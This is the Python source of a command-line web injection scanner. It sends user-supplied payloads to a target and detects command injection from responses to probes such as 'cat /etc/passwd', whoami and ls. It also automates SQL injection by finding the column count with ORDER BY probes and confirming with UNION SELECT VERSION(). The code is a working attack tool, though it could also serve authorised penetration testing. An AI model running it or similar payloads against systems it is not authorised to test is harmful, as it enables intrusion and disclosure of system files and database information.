from config import *
import requests
import os
from datetime import datetime
import itertools
import re
import click
from classes.VulnerableResource import VulnerableResource

def write_vulnerabilty_report(vulnerabilities_lines):
    """
    it writes text inside the output file. If the file and directories don't exist it creates them.

    :param vulnerabilities_lines: list of lines containing vulnerabilities to write inside the output file
    """

    directories, filename = os.path.split(VULNERABILITY_OUTPUT_PATH)

    if not os.path.exists(directories):
        os.makedirs(directories)

    with open(VULNERABILITY_OUTPUT_PATH, 'a+') as f:
        for message in vulnerabilities_lines:
            f.write(f'{message}\n')

def is_parameter_vulnerable(parameter_value, url_under_test, response):
    """
    it establishes if a parameter is: vulnerable, seems vulnerable or not vulnerable.

    :param parameter_value: value of the parameter under test
    :param url_under_test: server resource name
    :param response: HTTP response
    :return: enum with value: vulnerable, seems vulnerable or not vulnerable
    """
    
    # check expected results
    if 'ls' in parameter_value:
        if url_under_test in response.text:
            return VulnerableResource.VULNERABLE
    
    if 'cat /etc/passwd' in parameter_value:
        if 'root' in response.text:
            return VulnerableResource.VULNERABLE
    
    if ('head' in parameter_value or 'grep php' in parameter_value) and '.php' in parameter_value:
        if '<?php' in response.text:
            return VulnerableResource.VULNERABLE
    
    if 'whoami' in parameter_value:
        if CURRENT_USER in response.text:
            return VulnerableResource.VULNERABLE
    
    if 'ifconfig | grep inet' in parameter_value:
        if 'inet' in response.text:
            return VulnerableResource.VULNERABLE
    
    # if the payload contais command to find the number of columns
    if re.findall('[\'"1] ORDER BY \d+ -- -', parameter_value):
        # response is empty if column number is out of range
        if not response.text and 500 == response.status_code:
            return VulnerableResource.SEEMS_VULNERABLE

    return VulnerableResource.NOT_VULNERABLE

def read_requests_details(requests_file, requests_dict):
    """
    it reads the requests details file and saves data inside a dictionary.

    :param requests_file: input file containing the details
    :param requests_dict: dictionary containing the list of requests to be performed
    """
    
    with open(requests_file) as f:
        for line in f:
            values = line.strip().split(REQUESTS_SPLIT_VAL)

            requests_dict.append({ 
                'method':  values[0],
                'url': values[1],
                'parameters': values[2].split(REQUESTS_PARAMETERS_SPLIT_VAL),
            })

def read_payloads(payloads_file, requests_dict):
    """
    it reads the payloads file and saves data inside a dictionary.

    :param payloads_file: input file containing the payloads
    :param requests_dict: dictionary containing the list of requests to be performed
    :exception ValueError: if more payloads are specified and the payloads list contains the command to find the columns number
    :exception IndexError: if the length of the files is not the same
    """

    with open(payloads_file) as f:          
        i = 0

        for line in f:
            payloads = line.strip().split(PAYLOADS_SPLIT_VAL)

            # can't inject other payload with the command to find the columns number
            if len(payloads) > 1 and COMMAND_COLUMNS_NUMBER == payloads[0]:
                print(f'Only one payload can be injected with the {COMMAND_COLUMNS_NUMBER} command')
                raise ValueError()

            requests_dict[i]['payloads'] = payloads
            i += 1

        if i != len(requests_dict):
            raise IndexError()

def send_request(http_method, data, final_url):
    """
    it sends an HTTP request based on a specific HTTP method.

    :param http_method: HTTP metod
    :param data: data to be sent
    :param final_url: url containing target and resource
    :return: HTTP response
    :exception ValueError: if HTTP method is not supported
    """
    
    if 'GET' == http_method.upper():
        return requests.get(final_url, params=data)
    
    if 'POST' == http_method.upper():
        return requests.post(final_url, data=data)

    print(f'Method {http_method} is not supported. Check your input file')
    raise ValueError

def prepare_data(request_parameters, payloads, custom_value=None):
    """
    it prepares data used in HTTP request.

    :param request_parameters: list of parameters to be sent
    :param payloads: list of payloads to inject
    :param custom_value: if set, a custom value is inserted for specific parameters
    :return: prepared data
    """
    
    data = { }
    
    for i in range(len(request_parameters)):
        if custom_value and COMMAND_COLUMNS_NUMBER == payloads[i]:
            data[request_parameters[i]] = custom_value
        else:
            data[request_parameters[i]] = payloads[i]

    return data

def send_confirmation_request(vulnerable_parameter, injected_payload, number_of_columns, request_details, payloads, pre_union_value, vulnerabilities_lines):
    """
    it sends an HTTP request in order to confirm if a query is vulnerable. If the vulnerability is confirmed a new line will be saved to be written inside the output file.
    
    :param vulnerable_parameter: vulnerable parameter to be confirmed
    :param injected_payload: vulnerable parameter payload
    :param number_of_columns: number of columns found by injecting the ORDER BY command
    :param request_details: details of the request
    :param payloads: payloads to inject
    :param pre_union_value: char to prepend to the UNION command
    :param vulnerabilities_lines: list of lines containing vulnerabilities to write inside the output file
    :return: true if at least one vulnerability is confirmed (based on permutations), false otherwise
    """

    columns_values = ['VERSION()']

    for _ in range(1, number_of_columns): # skip a column, first one is replaced by the version command
        columns_values.append('NULL') # NULL allows to avoid type errors

    if DEBUG:
        print('\n[DEBUG] - STARTING VULNERABILITY CONFIRMATION')
        print(f'[DEBUG] - HTTP METHOD: {request_details["method"]}')

    is_vulnerability_confirmed = False

    # use set to remove repetitions
    for column_value in set(itertools.permutations(columns_values, number_of_columns)):
        confirmation_query = 'UNION SELECT '

        for column_val in column_value:
            confirmation_query += f'{column_val}, '
    
        confirmation_query = confirmation_query[:-2] # remove extra chars

        confirmation_data = prepare_data(request_details['parameters'], payloads, f'{pre_union_value} {confirmation_query} -- -')
        response = send_request(request_details['method'], confirmation_data, TARGET + request_details['url'])
        
        if DEBUG:
            print(f'[DEBUG] - COMPLETE URL: {response.url}')
            print(f'[DEBUG] - PARAMETERS AND VALUES: {confirmation_data}')
            print('[DEBUG] - RESPONSE')
            print(response.text)

        if re.findall('\d.\d.[\d.]+', response.text): # if the response contains a version format string then the vulnerability is confirmed            
            is_vulnerability_confirmed = True

            message = f'Found a command injection for URL: {request_details["url"][1:]}, HTTP method: {request_details["method"]}, parameter: {vulnerable_parameter}, payload: {injected_payload}. The table has {number_of_columns} column(s)'
            
            print(message)
            vulnerabilities_lines.append(f'{datetime.now()} - {message}')

        if is_vulnerability_confirmed:
            break

    if DEBUG:
        print('[DEBUG] - VULNERABILITY CONFIRMATION FINISHED')
        
    return is_vulnerability_confirmed

def prepare_data_and_send_request(requests_dict, vulnerabilities_lines, run_mode):
    """
    it prepares data and send an HTTP request for cmd and sql mode.

    :param requests_dict: dictionary containing the list of requests to be performed
    :param vulnerabilities_lines: list of lines containing vulnerabilities to write inside the output file
    :param run_mode: run mode [cmd, sql, xss]
    """
    
    for request in requests_dict:
        final_url = TARGET + request['url']

        # if at least one parameter hasn't a payload  
        if len(request['parameters']) > len(request['payloads']):
            for _ in range(len(request['parameters']) - len(request['payloads'])):
                request['payloads'].append('valid_string') # append a valid value for each parameter 

        # set current ORDER BY value
        current_column_number = 1

        # used to prepend char in ORDER BY command
        pre_order_by_values = ['\'', '"', '1']

        while True:
            end_loop = False

            noc_command_in_payloads = COMMAND_COLUMNS_NUMBER in request['payloads']

            # permutations of payloads based on parameters length
            for payload in set(itertools.permutations(request['payloads'], len(request['parameters']))):
                # if payload contains the command to find the number of columns and the run is set to sql mode 
                if noc_command_in_payloads and 'sql' == run_mode:
                    for pre_order_by_value in pre_order_by_values[:]: # loop over a copy of the list because elements can be removed
                        data = prepare_data(request['parameters'], payload, f'{pre_order_by_value} ORDER BY {current_column_number} -- -')
                        response = send_request(request['method'], data, final_url)

                        if 404 == response.status_code:
                            print(f'FILE NOT FOUND: {request["url"]}')                            
                            end_loop = True
                            break

                        if DEBUG:
                            print(f'\n[DEBUG] - URL: {request["url"][1:]}')
                            print(f'[DEBUG] - HTTP METHOD: {request["method"]}')
                            print(f'[DEBUG] - COMPLETE URL: {response.url}')
                            print(f'[DEBUG] - PARAMETERS AND VALUES: {data}')
                            
                            print('[DEBUG] - RESPONSE')
                            print(response.text)

                        for i in range(len(request['parameters'])):
                            if COMMAND_COLUMNS_NUMBER != payload[i]:
                                continue

                            if is_parameter_vulnerable(data[request['parameters'][i]] , request['url'][1:], response) == VulnerableResource.SEEMS_VULNERABLE:
                                number_of_columns = int(re.findall('\d+', data[request['parameters'][i]])[-1])-1

                                # if 0, char before ORDER BY 1 is not valid for the type used in query 
                                if number_of_columns > 0:
                                    # confirmation needed
                                    end_loop = send_confirmation_request(request['parameters'][i], data[request['parameters'][i]], number_of_columns, request, payload, pre_order_by_value, vulnerabilities_lines)
                                    break
                else: # simply inject commands
                    data = prepare_data(request['parameters'], payload)                    
                    response = send_request(request['method'], data, final_url)

                    if 404 == response.status_code:
                        print(f'FILE NOT FOUND: {request["url"]}')
                        break

                    if DEBUG:
                        print(f'\n[DEBUG] - URL: {request["url"][1:]}')
                        print(f'[DEBUG] - HTTP METHOD: {request["method"]}')
                        print(f'[DEBUG] - COMPLETE URL: {response.url}')
                        print(f'[DEBUG] - PARAMETERS AND VALUES: {data}')
                        
                        print('[DEBUG] - RESPONSE')
                        print(response.text)
                
                    for i in range(len(request['parameters'])):
                        if is_parameter_vulnerable(data[request['parameters'][i]] , request['url'][1:], response) == VulnerableResource.VULNERABLE:
                            message = f'Found a command injection for URL: {request["url"][1:]}, HTTP method: {request["method"]}, parameter: {request["parameters"][i]}, payload: {data[request["parameters"][i]]}'
            
                            print(message)
                            vulnerabilities_lines.append(f'{datetime.now()} - {message}')

            # found and confirmed number of columns
            if end_loop or not noc_command_in_payloads:
                break

            current_column_number += 1

@click.command()
@click.option('--mode', '-m', help='Injection mode [sql, cmd, xss]', type=click.Choice(['sql', 'cmd', 'xss']), required=True)
@click.option('--irequests', '-r', help='Requests details file', required=True)
@click.option('--ipayloads', '-p', help='Payloads file', required=True)
def main(mode, irequests, ipayloads):
    if DEBUG:
        print(f'[DEBUG] - RUN MODE: {mode}')

    requests_dict = [ ]

    try:
        read_requests_details(irequests, requests_dict)
        read_payloads(ipayloads, requests_dict)
    
        if DEBUG:
            print('[DEBUG] - REQUESTS DICTIONARY')
            print(requests_dict)

        vulnerabilities_lines = [ ]

        prepare_data_and_send_request(requests_dict, vulnerabilities_lines, mode)
        write_vulnerabilty_report(vulnerabilities_lines)
    except ValueError:
        exit()
    except IndexError:
        print('Error: mismatching rows number between requests details and payloads files')
        exit()
    except FileNotFoundError:
        print('Error: file not found. Check command-line options')

if __name__ == '__main__':
    main()